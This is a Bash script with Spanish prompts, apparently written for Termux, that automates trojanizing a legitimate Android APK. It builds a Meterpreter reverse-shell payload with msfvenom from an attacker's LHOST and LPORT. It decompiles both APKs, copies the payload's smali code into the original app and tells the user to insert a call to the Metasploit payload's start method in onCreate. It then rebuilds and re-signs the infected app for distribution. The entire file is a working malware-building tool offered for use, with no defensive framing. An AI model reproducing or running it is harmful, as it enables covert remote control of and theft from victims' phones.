#!/usr/bin
# da creditos si quieres copiar el codigo bro
# COLORES
clear
red='\e[1;31m'
default='\e[0m'
yellow='\e[0;33m'
orange='\e[38;5;166m'
green='\033[92m'
cian="\033[1;36m"
negro="\033[1;30m"

banner(){
echo -e $green"                                        "
echo -e "██╗███╗   ██╗███████╗███████╗ ██████╗████████╗"
echo -e "██║████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝"
echo -e "██║██╔██╗ ██║█████╗  █████╗  ██║        ██║   "
echo -e "██║██║╚██╗██║██╔══╝  ██╔══╝  ██║        ██║   "
echo -e "██║██║ ╚████║██║     ███████╗╚██████╗   ██║   "
echo -e "╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   "
echo -e "                BY JU4N                       "
echo ""
}


real(){
clear
banner
echo -e "$cian[*]elije :\n"
echo -e "$negro["1"$negro]$orange android/meterpreter/reverse_tcp "
echo -e "$negro["2"$negro]$orange android/meterpreter/reverse_http "
echo -e "$negro["2"$negro]$orange android/meterpreter/reverse_https "
echo -e "$red["0"$red]$red atras "
echo -n -e "$cian[+] Seleciona:"
read choose
if [ $choose -eq 1 ]; then
       payload="android/meterpreter/reverse_tcp"
elif [ $choose -eq 2 ]; then
       payload="android/meterpreter/reverse_http"
elif [ $choose -eq 3 ]; then
       payload="android/meterpreter/reverse_https"
elif [ $choose -eq 0 ]; then
             menu      
fi 

echo -e -n $negro"LHOST="
read lhost
echo -e -n $negro"LPORT="
read lport
echo -e -n $negro"ruta de la app="
read org
echo -e -n $negro"nuevo nombre de la app con .apk="
read out
sleep 2
clear
banner
echo -e -n $cian"GENERANDO TU APP INFECTADA\n"
msfvenom -p $payload LHOST=$lhost LPORT=$lport R > msf.apk
clear
banner
echo -e -n $green"decopilando payload\n"
apktool d msf.apk
clear
banner
echo -e -n $green"decopilando app\n"
apktool d $org -o /data/data/com.termux/files/home/infect_termux/original
cd msf
tar -cf - ./smali | (cd ../original; tar -xpf - )
cd ../original
clear 
grep -B2 "MAIN" AndroidManifest.xml
echo -e -n $negro"ruta del point="
read point
echo -e "$negro[presiona control + w y busca onCreate y pones esta linea en el medio de onCreate y local."
echo -e "$negro invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V      "
sleep 10.0
nano $point
clear
banner
apktool b /data/data/com.termux/files/home/infect_termux/original -o org1-modified.apk
sleep 1
clear
banner
keytool -genkey -V -keystore org1.keystore -alias org1 -keyalg RSA -keysize 2048 -validity 10000
sleep 1
clear
banner
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore org1.keystore org1-modified.apk org1
sleep 1
echo -e -n $negro"\n[ + ] FIRMANDO TU APP \n"
zipalign -v 4 org1-modified.apk $out
sleep 1
rm -rf /data/data/com.termux/files/home/infect_termux/org1.keystore
rm -rf /data/data/com.termux/files/home/infect_termux/msf
rm -rf /data/data/com.termux/files/home/infect_termux/original
rm -rf /data/data/com.termux/files/home/infect_termux/msf.apk

echo -e $cian"App Guardada Como:$out"
}


menu(){
clear
banner
echo -e "$cian[*]elije xd:"
echo -e "$negro["1"$negro]$orange Infectar real apk "
echo -e "$red["0"$red]$red exit "
echo -n -e "$cian[+] Seleciona: "
read play
if [ $play -eq 1 ]; then
	real
elif [ $play -eq 0 ]; then
	exit
fi
}
menu
